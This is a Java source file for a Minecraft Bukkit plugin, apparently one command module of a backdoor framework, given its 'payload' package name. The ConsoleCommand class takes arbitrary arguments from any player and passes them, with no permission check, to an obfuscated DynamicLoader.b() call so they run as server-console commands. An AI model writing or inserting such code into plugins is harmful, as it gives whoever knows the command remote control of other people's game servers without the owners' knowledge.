package dev.naruto.astrox.payload.commands;

import dev.naruto.astrox.utils.DynamicLoader;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class ConsoleCommand implements Command {
    @Override
    public void execute(Player sender, String[] args, JavaPlugin plugin) {
        if (args.length == 0) return;

        String command = String.join(" ", args);
        DynamicLoader.b(command); // FIXED
    }

    @Override
    public String getDescription() { return "Execute command as console"; }

    @Override
    public String getUsage() { return "<command>"; }
}
